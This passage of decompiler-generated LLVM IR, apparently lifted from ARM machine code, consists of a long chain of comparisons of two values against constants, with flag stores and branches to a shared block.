  store i1 %v2_e9a0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9a0, label %dec_label_pc_e858, label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9a0, %bb1401
  %v2_e9b8 = icmp ugt i32 %v1_e870, 132
  store i1 %v2_e9b8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b8 = icmp eq i32 %v1_e870, 133
  store i1 %v7_e9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b8, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_e9b8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9cc

.thread31:                                        ; preds = %dec_label_pc_e9b8
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9c4 = icmp eq i1 %v7_e9a0, false
  store i1 %v2_e9c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9c4, label %dec_label_pc_e9cc, label %dec_label_pc_e858

dec_label_pc_e9cc:                                ; preds = %.thread32, %.thread31
  %v2_e9cc = icmp ugt i32 %v1_e870, 143
  store i1 %v2_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9cc = icmp eq i32 %v1_e870, 144
  store i1 %v7_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9cc, label %.thread35, label %.thread36

.thread36:                                        ; preds = %dec_label_pc_e9cc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9e0

.thread35:                                        ; preds = %dec_label_pc_e9cc
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9d8 = icmp eq i1 %v7_e9a0, false
  store i1 %v2_e9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9d8, label %dec_label_pc_e9e0, label %dec_label_pc_e858

dec_label_pc_e9e0:                                ; preds = %.thread36, %.thread35
  %v2_e9e0 = icmp ugt i32 %v1_e870, 148
  store i1 %v2_e9e0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e0 = icmp eq i32 %v1_e870, 149
  %.1983 = zext i1 %v7_e9e0 to i32
  %v2_e9ec = and i32 %.1983, %.1982
  %v4_e9ec = icmp eq i32 %v2_e9ec, 0
  store i1 %v4_e9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_e9ec, label %dec_label_pc_e9f4, label %dec_label_pc_e858

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e9e0
  %v2_e9f4 = icmp ugt i32 %v1_e870, 156
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i32 %v1_e870, 157
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %.thread40, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_e9f4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea08

.thread40:                                        ; preds = %dec_label_pc_e9f4
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea00 = icmp eq i1 %v7_e9a0, false
  store i1 %v2_ea00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea00, label %dec_label_pc_ea08, label %dec_label_pc_e858

dec_label_pc_ea08:                                ; preds = %.thread41, %.thread40
  %v2_ea08 = icmp ugt i32 %v1_e870, 183
  store i1 %v2_ea08, i1* %cpsr_c.global-to-local, align 1
  %v7_ea08 = icmp eq i32 %v1_e870, 184
  store i1 %v7_ea08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea08, label %.thread44, label %.thread45

.thread45:                                        ; preds = %dec_label_pc_ea08
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea1c

.thread44:                                        ; preds = %dec_label_pc_ea08
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea14 = icmp eq i1 %v7_e9a0, false
  store i1 %v2_ea14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea14, label %dec_label_pc_ea1c, label %dec_label_pc_e858

dec_label_pc_ea1c:                                ; preds = %.thread45, %.thread44
  %v2_ea1c = icmp ugt i32 %v1_e870, 189
  store i1 %v2_ea1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea1c = icmp eq i32 %v1_e870, 190
  store i1 %v7_ea1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea1c, label %.thread48, label %.thread49

.thread49:                                        ; preds = %dec_label_pc_ea1c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea30

.thread48:                                        ; preds = %dec_label_pc_ea1c
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea28 = icmp eq i1 %v7_e9a0, false
  store i1 %v2_ea28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea28, label %dec_label_pc_ea30, label %dec_label_pc_e858

dec_label_pc_ea30:                                ; preds = %.thread49, %.thread48
  %v2_ea30 = icmp ugt i32 %v1_e870, 195
  store i1 %v2_ea30, i1* %cpsr_c.global-to-local, align 1
  %v7_ea30 = icmp eq i32 %v1_e870, 196
  %.1984 = zext i1 %v7_ea30 to i32
  store i32 %.1984, i32* %r3.global-to-local, align 4
  %v2_ea3c = and i32 %.1984, %.1982
  %v4_ea3c = icmp eq i32 %v2_ea3c, 0
  store i1 %v4_ea3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ea3c, label %dec_label_pc_ea48, label %dec_label_pc_e858

dec_label_pc_ea48:                                ; preds = %dec_label_pc_ea30
  %v7_ea48 = icmp eq i32 %v1_e85c, 152
  %.1985 = zext i1 %v7_ea48 to i32
  %v2_ea54 = icmp ugt i32 %v1_e870, 81
  store i1 %v2_ea54, i1* %cpsr_c.global-to-local, align 1
  %v7_ea54 = icmp eq i32 %v1_e870, 82
  store i1 %v7_ea54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea54, label %bb1408, label %dec_label_pc_ea64

bb1408:                                           ; preds = %dec_label_pc_ea48
  %v2_ea48 = icmp ugt i32 %v1_e85c, 151
  store i1 %v2_ea48, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ea48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea48, label %dec_label_pc_e858, label %dec_label_pc_ea64

dec_label_pc_ea64:                                ; preds = %dec_label_pc_ea48, %bb1408
  %v2_ea64 = icmp ugt i32 %v1_e870, 228
  store i1 %v2_ea64, i1* %cpsr_c.global-to-local, align 1
  %v7_ea64 = icmp eq i32 %v1_e870, 229
  %.1986 = zext i1 %v7_ea64 to i32
  store i32 %.1986, i32* %r3.global-to-local, align 4
  %v2_ea70 = and i32 %.1986, %.1985
  %v4_ea70 = icmp eq i32 %v2_ea70, 0
  store i1 %v4_ea70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ea70, label %dec_label_pc_ea7c, label %dec_label_pc_e858

dec_label_pc_ea7c:                                ; preds = %dec_label_pc_ea64
  %v7_ea7c = icmp eq i32 %v1_e85c, 157
  %.1987 = zext i1 %v7_ea7c to i32
  %v2_ea88 = icmp ugt i32 %v1_e870, 201
  store i1 %v2_ea88, i1* %cpsr_c.global-to-local, align 1
  %v7_ea88 = icmp eq i32 %v1_e870, 202
  %storemerge1217 = zext i1 %v7_ea88 to i32
  store i32 %storemerge1217, i32* %r3.global-to-local, align 4
  %v2_ea94 = and i32 %storemerge1217, %.1987
  %v4_ea94 = icmp eq i32 %v2_ea94, 0
  store i1 %v4_ea94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ea94, label %dec_label_pc_eaa4, label %dec_label_pc_e858

dec_label_pc_eaa4:                                ; preds = %dec_label_pc_ea7c
  store i32 %.1987, i32* %r3.global-to-local, align 4
  %v2_eaa8 = icmp ugt i32 %v1_e870, 216
  store i1 %v2_eaa8, i1* %cpsr_c.global-to-local, align 1
  %v7_eaa8 = icmp eq i32 %v1_e870, 217
  store i1 %v7_eaa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eaa8, label %.thread60, label %.thread61

.thread61:                                        ; preds = %dec_label_pc_eaa4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eabc

.thread60:                                        ; preds = %dec_label_pc_eaa4
  store i32 %.1987, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eab4 = icmp eq i1 %v7_ea7c, false
  store i1 %v2_eab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eab4, label %dec_label_pc_eabc, label %dec_label_pc_e858

dec_label_pc_eabc:                                ; preds = %.thread61, %.thread60
  %v2_eabc = icmp ugt i32 %v1_e85c, 160
  store i1 %v2_eabc, i1* %cpsr_c.global-to-local, align 1
  %v7_eabc = icmp eq i32 %v1_e85c, 161
  store i1 %v7_eabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eabc, label %bb1415, label %dec_label_pc_eac8

bb1415:                                           ; preds = %dec_label_pc_eabc
  %v3_eac0 = icmp ugt i32 %v1_e870, 123
  store i1 %v3_eac0, i1* %cpsr_c.global-to-local, align 1
  %v8_eac0 = icmp eq i32 %v1_e870, 124
  store i1 %v8_eac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eac0, label %dec_label_pc_e858, label %dec_label_pc_eac8

dec_label_pc_eac8:                                ; preds = %dec_label_pc_eabc, %bb1415
  %v7_eac8 = icmp eq i32 %v1_e85c, 162
  %.1988 = zext i1 %v7_eac8 to i32
  %v2_ead4 = icmp ugt i32 %v1_e870, 31
  store i1 %v2_ead4, i1* %cpsr_c.global-to-local, align 1
  %v7_ead4 = icmp eq i32 %v1_e870, 32
  %storemerge1219 = zext i1 %v7_ead4 to i32
  store i32 %storemerge1219, i32* %r3.global-to-local, align 4
  %v2_eae0 = and i32 %storemerge1219, %.1988
  %v4_eae0 = icmp eq i32 %v2_eae0, 0
  store i1 %v4_eae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eae0, label %dec_label_pc_eaf0, label %dec_label_pc_e858

dec_label_pc_eaf0:                                ; preds = %dec_label_pc_eac8
  %v7_eaf0 = icmp eq i32 %v1_e85c, 155
  %.1989 = zext i1 %v7_eaf0 to i32
  %v2_eafc = icmp ugt i32 %v1_e870, 95
  store i1 %v2_eafc, i1* %cpsr_c.global-to-local, align 1
  %v7_eafc = icmp eq i32 %v1_e870, 96
  store i1 %v7_eafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eafc, label %bb1422, label %dec_label_pc_eb0c

bb1422:                                           ; preds = %dec_label_pc_eaf0
  %v2_eaf0 = icmp ugt i32 %v1_e85c, 154
  store i1 %v2_eaf0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eaf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eaf0, label %dec_label_pc_e858, label %dec_label_pc_eb0c

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eaf0, %bb1422
  %v2_eb0c = and i32 %.1983, %.1989
  %v4_eb0c = icmp eq i32 %v2_eb0c, 0
  store i1 %v4_eb0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eb0c, label %dec_label_pc_eb14, label %dec_label_pc_e858

dec_label_pc_eb14:                                ; preds = %dec_label_pc_eb0c
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_eb18 = icmp ugt i32 %v1_e870, 154
  store i1 %v2_eb18, i1* %cpsr_c.global-to-local, align 1
  %v7_eb18 = icmp eq i32 %v1_e870, 155
  store i1 %v7_eb18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb18, label %.thread71, label %.thread72

.thread72:                                        ; preds = %dec_label_pc_eb14
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eb2c

.thread71:                                        ; preds = %dec_label_pc_eb14
  store i32 %.1989, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb24 = icmp eq i1 %v7_eaf0, false
  store i1 %v2_eb24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eb24, label %dec_label_pc_eb2c, label %dec_label_pc_e858

dec_label_pc_eb2c:                                ; preds = %.thread72, %.thread71
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_eb30 = icmp ugt i32 %v1_e870, 177
  store i1 %v2_eb30, i1* %cpsr_c.global-to-local, align 1
  %v7_eb30 = icmp eq i32 %v1_e870, 178
  store i1 %v7_eb30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb30, label %.thread75, label %.thread76

.thread76:                                        ; preds = %dec_label_pc_eb2c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eb44

.thread75:                                        ; preds = %dec_label_pc_eb2c
  store i32 %.1989, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb3c = icmp eq i1 %v7_eaf0, false
  store i1 %v2_eb3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eb3c, label %dec_label_pc_eb44, label %dec_label_pc_e858

dec_label_pc_eb44:                                ; preds = %.thread76, %.thread75
  %v7_eb44 = icmp eq i32 %v1_e85c, 164
  %.1990 = zext i1 %v7_eb44 to i32
  %v2_eb50 = icmp ugt i32 %v1_e870, 157
  store i1 %v2_eb50, i1* %cpsr_c.global-to-local, align 1
  %v7_eb50 = icmp eq i32 %v1_e870, 158
  store i1 %v7_eb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb50, label %bb1425, label %dec_label_pc_eb60

bb1425:                                           ; preds = %dec_label_pc_eb44
  %v2_eb44 = icmp ugt i32 %v1_e85c, 163
  store i1 %v2_eb44, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb44, label %dec_label_pc_e858, label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb44, %bb1425
  %v2_eb60 = icmp ugt i32 %v1_e85c, 155
  store i1 %v2_eb60, i1* %cpsr_c.global-to-local, align 1
  %v7_eb60 = icmp eq i32 %v1_e85c, 156
  store i1 %v7_eb60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb60, label %bb1426, label %dec_label_pc_eb6c

bb1426:                                           ; preds = %dec_label_pc_eb60
  %v3_eb64 = icmp ugt i32 %v1_e870, 8
  store i1 %v3_eb64, i1* %cpsr_c.global-to-local, align 1
  %v8_eb64 = icmp eq i32 %v1_e870, 9
  store i1 %v8_eb64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eb64, label %dec_label_pc_e858, label %dec_label_pc_eb6c

dec_label_pc_eb6c:                                ; preds = %dec_label_pc_eb60, %bb1426
  %v7_eb6c = icmp eq i32 %v1_e85c, 167
  %.1991 = zext i1 %v7_eb6c to i32
  store i32 %.1991, i32* %r3.global-to-local, align 4
  %v2_eb78 = icmp ugt i32 %v1_e870, 43
  store i1 %v2_eb78, i1* %cpsr_c.global-to-local, align 1
  %v7_eb78 = icmp eq i32 %v1_e870, 44
  store i1 %v7_eb78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb78, label %bb1429, label %dec_label_pc_eb88

bb1429:                                           ; preds = %dec_label_pc_eb6c
  %v2_eb6c = icmp ugt i32 %v1_e85c, 166
  store i1 %v2_eb6c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb6c, label %dec_label_pc_e858, label %dec_label_pc_eb88

dec_label_pc_eb88:                                ; preds = %dec_label_pc_eb6c, %bb1429
  %v2_eb88 = icmp ugt i32 %v1_e870, 67
  %v7_eb88 = icmp eq i32 %v1_e870, 68
  %.1992 = zext i1 %v7_eb88 to i32
  %v2_eb94 = icmp ugt i32 %v1_e85c, 167
  store i1 %v2_eb94, i1* %cpsr_c.global-to-local, align 1
  %v7_eb94 = icmp eq i32 %v1_e85c, 168
  %storemerge1224 = zext i1 %v7_eb94 to i32
  store i32 %storemerge1224, i32* %r3.global-to-local, align 4
  %v2_eba0 = and i32 %.1992, %storemerge1224
  %v4_eba0 = icmp eq i32 %v2_eba0, 0
  store i1 %v4_eba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eba0, label %dec_label_pc_ebac, label %dec_label_pc_e858

dec_label_pc_ebac:                                ; preds = %dec_label_pc_eb88
  %v2_ebac = icmp ugt i32 %v1_e870, 84
  store i1 %v2_ebac, i1* %cpsr_c.global-to-local, align 1
  %v7_ebac = icmp eq i32 %v1_e870, 85
  %.1993 = zext i1 %v7_ebac to i32
  %v2_ebb8 = and i32 %.1993, %storemerge1224
  %v4_ebb8 = icmp eq i32 %v2_ebb8, 0
  store i1 %v4_ebb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ebb8, label %dec_label_pc_ebc4, label %dec_label_pc_e858

dec_label_pc_ebc4:                                ; preds = %dec_label_pc_ebac
  %v2_ebc4 = icmp ugt i32 %v1_e870, 101
  store i1 %v2_ebc4, i1* %cpsr_c.global-to-local, align 1
  %v7_ebc4 = icmp eq i32 %v1_e870, 102
  store i1 %v7_ebc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebc4, label %.thread91, label %.thread92

.thread92:                                        ; preds = %dec_label_pc_ebc4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ebd8

.thread91:                                        ; preds = %dec_label_pc_ebc4
  store i32 %storemerge1224, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebd0 = icmp eq i1 %v7_eb94, false
  store i1 %v2_ebd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebd0, label %dec_label_pc_ebd8, label %dec_label_pc_e858

dec_label_pc_ebd8:                                ; preds = %.thread92, %.thread91
  %v2_ebd8 = icmp ugt i32 %v1_e870, 58
  %v7_ebd8 = icmp eq i32 %v1_e870, 59
  %.1994 = zext i1 %v7_ebd8 to i32
  store i32 %.1994, i32* %r3.global-to-local, align 4
  %v2_ebe4 = icmp ugt i32 %v1_e85c, 202
  store i1 %v2_ebe4, i1* %cpsr_c.global-to-local, align 1
  %v7_ebe4 = icmp eq i32 %v1_e85c, 203
  store i1 %v7_ebe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebe4, label %bb1438, label %dec_label_pc_ebf4

bb1438:                                           ; preds = %dec_label_pc_ebd8
  store i1 %v2_ebd8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebd8, label %dec_label_pc_e858, label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebd8, %bb1438
  %v2_ebf4 = icmp ugt i32 %v1_e870, 33
  %v7_ebf4 = icmp eq i32 %v1_e870, 34
  %.1995 = zext i1 %v7_ebf4 to i32
  %v2_ec00 = icmp ugt i32 %v1_e85c, 203
  store i1 %v2_ec00, i1* %cpsr_c.global-to-local, align 1
  %v7_ec00 = icmp eq i32 %v1_e85c, 204
  store i1 %v7_ec00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec00, label %bb1441, label %dec_label_pc_ec10

bb1441:                                           ; preds = %dec_label_pc_ebf4
  store i1 %v2_ebf4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebf4, label %dec_label_pc_e858, label %dec_label_pc_ec10

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ebf4, %bb1441
  %v7_ec10 = icmp eq i32 %v1_e85c, 207
  %.1996 = zext i1 %v7_ec10 to i32
  %v2_ec1c = icmp ugt i32 %v1_e870, 29
  store i1 %v2_ec1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec1c = icmp eq i32 %v1_e870, 30
  store i1 %v7_ec1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec1c, label %bb1444, label %dec_label_pc_ec2c

bb1444:                                           ; preds = %dec_label_pc_ec10
  %v2_ec10 = icmp ugt i32 %v1_e85c, 206
  store i1 %v2_ec10, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec10, label %dec_label_pc_e858, label %dec_label_pc_ec2c

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec10, %bb1444
  %v7_ec2c = icmp eq i32 %v1_e870, 55
  %.1997 = zext i1 %v7_ec2c to i32
  %v2_ec38 = icmp ugt i32 %v1_e85c, 116
  store i1 %v2_ec38, i1* %cpsr_c.global-to-local, align 1
  %v7_ec38 = icmp eq i32 %v1_e85c, 117
  %storemerge1230 = zext i1 %v7_ec38 to i32
  store i32 %storemerge1230, i32* %r3.global-to-local, align 4
  %v2_ec44 = and i32 %.1997, %storemerge1230
  %v4_ec44 = icmp eq i32 %v2_ec44, 0
  store i1 %v4_ec44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ec44, label %dec_label_pc_ec50, label %dec_label_pc_e858

dec_label_pc_ec50:                                ; preds = %dec_label_pc_ec2c
  %v2_ec50 = icmp ugt i32 %v1_e870, 55
  store i1 %v2_ec50, i1* %cpsr_c.global-to-local, align 1
  %v7_ec50 = icmp eq i32 %v1_e870, 56
  %.1998 = zext i1 %v7_ec50 to i32
  %v2_ec5c = and i32 %.1998, %storemerge1230
  %v4_ec5c = icmp eq i32 %v2_ec5c, 0
  store i1 %v4_ec5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ec5c, label %dec_label_pc_ec68, label %dec_label_pc_e858

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec50
  %v7_ec68 = icmp eq i32 %v1_e85c, 80
  %.1999 = zext i1 %v7_ec68 to i32
  store i32 %.1999, i32* %r3.global-to-local, align 4
  %v2_ec74 = icmp ugt i32 %v1_e870, 234
  store i1 %v2_ec74, i1* %cpsr_c.global-to-local, align 1
  %v7_ec74 = icmp eq i32 %v1_e870, 235
  store i1 %v7_ec74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec74, label %bb1453, label %dec_label_pc_ec84

bb1453:                                           ; preds = %dec_label_pc_ec68
  %v2_ec68 = icmp ugt i32 %v1_e85c, 79
  store i1 %v2_ec68, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec68, label %dec_label_pc_e858, label %dec_label_pc_ec84

dec_label_pc_ec84:                                ; preds = %dec_label_pc_ec68, %bb1453
  store i32 %.1996, i32* %r3.global-to-local, align 4
  %v2_ec88 = icmp ugt i32 %v1_e870, 119
  store i1 %v2_ec88, i1* %cpsr_c.global-to-local, align 1
  %v7_ec88 = icmp eq i32 %v1_e870, 120
  store i1 %v7_ec88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec88, label %.thread114, label %.thread115

.thread115:                                       ; preds = %dec_label_pc_ec84
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec9c

.thread114:                                       ; preds = %dec_label_pc_ec84
  store i32 %.1996, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec94 = icmp eq i1 %v7_ec10, false
  store i1 %v2_ec94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec94, label %dec_label_pc_ec9c, label %dec_label_pc_e858

dec_label_pc_ec9c:                                ; preds = %.thread115, %.thread114
  %v7_ec9c = icmp eq i32 %v1_e85c, 209
  %.2000 = zext i1 %v7_ec9c to i32
  %v2_eca8 = icmp ugt i32 %v1_e870, 34
  store i1 %v2_eca8, i1* %cpsr_c.global-to-local, align 1
  %v7_eca8 = icmp eq i32 %v1_e870, 35
  store i1 %v7_eca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eca8, label %bb1456, label %dec_label_pc_ecb8

bb1456:                                           ; preds = %dec_label_pc_ec9c
  %v2_ec9c = icmp ugt i32 %v1_e85c, 208
  store i1 %v2_ec9c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec9c, label %dec_label_pc_e858, label %dec_label_pc_ecb8

dec_label_pc_ecb8:                                ; preds = %dec_label_pc_ec9c, %bb1456
  %v7_ecb8 = icmp eq i32 %v1_e85c, 64
  %.2001 = zext i1 %v7_ecb8 to i32
  %v2_ecc4 = icmp ugt i32 %v1_e870, 69
  store i1 %v2_ecc4, i1* %cpsr_c.global-to-local, align 1
  %v7_ecc4 = icmp eq i32 %v1_e870, 70
  store i1 %v7_ecc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ecc4, label %bb1459, label %dec_label_pc_ecd4

bb1459:                                           ; preds = %dec_label_pc_ecb8
  %v2_ecb8 = icmp ugt i32 %v1_e85c, 63
  store i1 %v2_ecb8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ecb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ecb8, label %dec_label_pc_e858, label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ecb8, %bb1459
  %v7_ecd4 = icmp eq i32 %v1_e85c, 172
  %.2002 = zext i1 %v7_ecd4 to i32
  store i32 %.2002, i32* %r3.global-to-local, align 4
  %v2_ece0 = icmp ugt i32 %v1_e870, 14
  store i1 %v2_ece0, i1* %cpsr_c.global-to-local, align 1
  %v7_ece0 = icmp eq i32 %v1_e870, 15
  store i1 %v7_ece0, i1* %cpsr_z.global-to-local, align 1
  %v2_ece4 = xor i1 %v2_ece0, true
  %v3_ece4 = or i1 %v7_ece0, %v2_ece4
  br i1 %v3_ece4, label %bb1462, label %bb1463

bb1462:                                           ; preds = %dec_label_pc_ecd4
  br label %bb1463

bb1463:                                           ; preds = %dec_label_pc_ecd4, %bb1462
  %v1_ecec825 = phi i32 [ %.2000, %dec_label_pc_ecd4 ], [ 0, %bb1462 ]
  %v2_ece8 = xor i1 %v7_ece0, true
  %v3_ece8 = and i1 %v2_ece0, %v2_ece8
  br i1 %v3_ece8, label %bb1464, label %bb1465

bb1464:                                           ; preds = %bb1463
  br label %bb1465

bb1465:                                           ; preds = %bb1463, %bb1464
  %v0_f2c0 = phi i32 [ %v1_ecec825, %bb1463 ], [ 1, %bb1464 ]
  %v2_ecec = and i32 %v0_f2c0, %.2002
  %v4_ecec = icmp eq i32 %v2_ecec, 0
  store i1 %v4_ecec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ecec, label %dec_label_pc_ed04, label %dec_label_pc_ecfc

dec_label_pc_ecfc:                                ; preds = %bb1465
  %v2_ecfc = icmp ugt i32 %v1_e870, 30
  store i1 %v2_ecfc, i1* %cpsr_c.global-to-local, align 1
  %v7_ecfc = icmp eq i32 %v1_e870, 31
  store i1 %v7_ecfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ed00 = xor i1 %v2_ecfc, true
  %v3_ed00 = or i1 %v7_ecfc, %v2_ed00
  br i1 %v3_ed00, label %dec_label_pc_e858, label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ecfc, %bb1465
  %v2_ed04 = icmp ugt i32 %v1_e870, 62
  store i1 %v2_ed04, i1* %cpsr_c.global-to-local, align 1
  %v7_ed04 = icmp eq i32 %v1_e870, 63
  store i1 %v7_ed04, i1* %cpsr_z.global-to-local, align 1
  %v2_ed08 = xor i1 %v2_ed04, true
  %v3_ed08 = or i1 %v7_ed04, %v2_ed08
  br i1 %v3_ed08, label %bb1466, label %bb1467

bb1466:                                           ; preds = %dec_label_pc_ed04
  br label %bb1467

bb1467:                                           ; preds = %dec_label_pc_ed04, %bb1466
  %v0_ed10827 = phi i32 [ %.2001, %dec_label_pc_ed04 ], [ 0, %bb1466 ]
  %v2_ed0c = xor i1 %v7_ed04, true
  %v3_ed0c = and i1 %v2_ed04, %v2_ed0c
  br i1 %v3_ed0c, label %bb1468, label %bb1469

bb1468:                                           ; preds = %bb1467
  br label %bb1469

bb1469:                                           ; preds = %bb1467, %bb1468
  %v0_ff0c = phi i32 [ %v0_ed10827, %bb1467 ], [ 1, %bb1468 ]
  store i32 %v0_ff0c, i32* %r3.global-to-local, align 4
  %v2_ed14 = icmp ugt i32 %v1_e85c, 99
